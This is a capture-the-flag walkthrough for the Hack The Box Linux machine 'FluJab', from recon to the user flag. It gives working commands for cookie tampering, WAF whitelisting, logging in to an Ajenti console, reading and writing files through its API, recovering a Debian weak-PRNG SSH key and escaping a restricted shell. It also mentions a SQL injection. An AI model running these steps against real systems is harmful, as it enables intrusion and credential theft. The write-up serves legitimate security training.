## Overview

FluJab is a hard-difficulty Linux box that lives up to its reputation as an enumeration marathon. A wildcard TLS certificate exposes more than a dozen virtual hosts; the useful one hides an admin console behind a custom "ClownWare" reverse-proxy WAF. The path to user chains cookie tampering (to whitelist our IP through the WAF), a UNION SQL injection (for console creds), an Ajenti console with an unrestricted filesystem API, a weak Debian-PRNG SSH key, and a TCP-wrappers bypass. This post covers recon through `user.txt`.

A self-described enumeration marathon where a wildcard TLS cert leaks a dozen vhosts; enumeration is the dominant axis, chaining cookie tamper, SQLi, Ajenti file API, and a weak Debian-PRNG SSH key.

## Recon

```bash
nmap -p- --min-rate 1000 -T4 10.129.7.212
nmap -sC -sV -p22,80,443,8080 10.129.7.212
```

| Port | Service | Notes |
|------|---------|-------|
| 22   | OpenSSH | restricted |
| 80   | nginx "ClownWare Proxy" | redirects to HTTPS |
| 443  | nginx (TLS) | WAF; cert SAN leaks vhosts |
| 8080 | nginx (TLS) | admin console (gated) |

The certificate's Subject Alternative Names are the real find — a long list of vhosts: `freeflujab.htb`, `smtp.flujab.htb`, `sysadmin-console-01.flujab.htb`, and many decoys. Add them to `/etc/hosts`.

## Enumeration

Most vhosts are decoys (videos/gifs) or return the WAF's "Direct IP access not allowed" page. Two matter: `smtp.flujab.htb` (a login panel with a "deprecated" comment) and `freeflujab.htb` (a flu-jab booking site with `?login`, `?register`, `?book`, `?smtp_config`, `?whitelist` features).

Watching the cookies on `freeflujab.htb/?login` reveals a base64 cookie named `Modus` for the path `/?smtp_config`, decoding to `Configure=Null`.

## Foothold

### 1 — Cookie tamper to reach the SMTP config

Flip the authorization cookie to `Configure=True` and request the config page:

```bash
python3 -c "import base64;print(base64.b64encode(b'Configure=True').decode())"   # Q29uZmlndXJlPVRydWU=
```

### 2 — Whitelist our IP through the WAF

The SMTP-config page lets us set a "mail server" IP, which the backend adds to the proxy whitelist. A cron job propagates the whitelist into nginx roughly once a minute:

```bash
curl -sk --resolve freeflujab.htb:443:10.129.7.212 -X POST "https://freeflujab.htb/?smtp_config" \
  -H "Cookie: Modus=Q29uZmlndXJlPVRydWU%3D" \
  --data "mailserver=10.10.16.13&port=25&save=Save+Mail+Server+Config"
# confirm at /?whitelist, then wait ~60s for the nginx cron
```

After the cron runs, `sysadmin-console-01.flujab.htb:8080` stops redirecting to the WAF denial page and shows an Ajenti login.

### 3 — Console login

The console credentials (`sysadm:th3doct0r`) come from a UNION SQL injection in the `nhsnum` reminder parameter on `freeflujab.htb`, whose results are exfiltrated over email and whose SHA-256 admin hash cracks instantly. Log in via the JSON API:

```bash
curl -sk --resolve sysadmin-console-01.flujab.htb:8080:10.129.7.212 -c /tmp/aj.cj \
  -X POST "https://sysadmin-console-01.flujab.htb:8080/api/core/auth" \
  -H "Content-Type: application/json" \
  --data '{"mode":"normal","username":"sysadm","password":"th3doct0r"}'
```

### 4 — Ajenti file API → weak key + TCP-wrapper bypass

Ajenti runs as root and its filesystem API has no path restriction. Read `drno`'s public key and write our IP into `/etc/hosts.allow` (which TCP wrappers evaluate before the `hosts.deny` that blocks sshd):

```bash
curl -sk --resolve sysadmin-console-01.flujab.htb:8080:10.129.7.212 -b /tmp/aj.cj \
  "https://sysadmin-console-01.flujab.htb:8080/api/filesystem/read/home/drno/.ssh/authorized_keys" > drno_authkey.pub
curl -sk --resolve sysadmin-console-01.flujab.htb:8080:10.129.7.212 -b /tmp/aj.cj \
  -X POST "https://sysadmin-console-01.flujab.htb:8080/api/filesystem/write/etc/hosts.allow" \
  --data-binary $'sshd: 10.10.16.13\nALL: 10.10.16.13\n'
```

`drno`'s key was generated with the broken Debian OpenSSL PRNG, so the private key is recoverable from a public precomputed set:

```bash
ssh-keygen -l -f drno_authkey.pub     # 4096-bit
curl -sL "https://raw.githubusercontent.com/g0tmi1k/debian-ssh/master/uncommon_keys/debian_ssh_rsa_4096_x86.tar.bz2" -o keys.tar.bz2 && tar xjf keys.tar.bz2
grep -RlF "$(awk '{print $2}' drno_authkey.pub | cut -c40-110)" rsa/4096/   # -> dead0b5b...23269.pub
cp rsa/4096/dead0b5b829ea2e3d22f47a7cbde17a6-23269 drno_priv; chmod 600 drno_priv
```

### 5 — SSH as drno (rbash escape)

```bash
ssh -i drno_priv drno@10.129.7.212 -t bash      # -t bash escapes the restricted shell
```

cat /home/drno/user.txt    # HTB{...}
